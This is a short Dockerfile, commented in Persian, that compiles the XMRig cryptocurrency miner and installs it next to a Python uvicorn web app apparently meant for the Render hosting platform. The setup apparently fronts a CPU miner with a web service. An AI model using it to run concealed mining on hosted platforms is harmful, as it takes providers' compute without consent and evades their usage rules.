FROM python:3.11-slim

# نصب وابستگی‌های سیستمی برای کامپایل XMRig
RUN apt-get update && apt-get install -y \
    git \
    build-essential \
    cmake \
    libuv1-dev \
    libssl-dev \
    libhwloc-dev \
    && rm -rf /var/lib/apt/lists/*

# کلون و کامپایل XMRig
RUN git clone https://github.com/xmrig/xmrig.git /xmrig
WORKDIR /xmrig
RUN mkdir build && cd build && \
    cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_OPENCL=OFF -DWITH_CUDA=OFF && \
    make -j2

# کپی فایل اجرایی به مسیر سیستم
RUN cp /xmrig/build/xmrig /usr/local/bin/xmrig && \
    chmod +x /usr/local/bin/xmrig

# کپی کد پایتون
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY main.py .

# پورت‌ها (Render از پورت 10000 یا متغیر PORT استفاده می‌کند)
EXPOSE 8080 8081

CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8080"]
